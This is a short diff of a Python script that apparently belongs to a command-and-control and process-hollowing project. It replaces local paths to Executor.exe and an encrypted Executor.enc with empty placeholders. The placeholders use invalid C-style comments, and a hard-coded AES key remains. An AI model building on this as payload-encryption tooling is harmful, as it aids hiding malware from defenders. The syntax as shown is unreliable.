@@ -19,8 +19,8 @@ logging.basicConfig(
 )
 
 # File Paths
-executor_path = r"C:\Users\berzerker\Desktop\The Folder\My Project\Other Project\C2 Framework Project VMWare\Obfucation Project Host using Python 64bit Target\Hollow\Executor.exe"
-encrypted_path = r"C:\Users\berzerker\Desktop\The Folder\My Project\Other Project\C2 Framework Project VMWare\Obfucation Project Host using Python 64bit Target\Hollow\Executor.enc"
+executor_path = r"" /*Payload PATH*/
+encrypted_path = r"" /*Enc PATH*/
 
 # AES Key (16 bytes)
 key = b'Sixteen byte key'
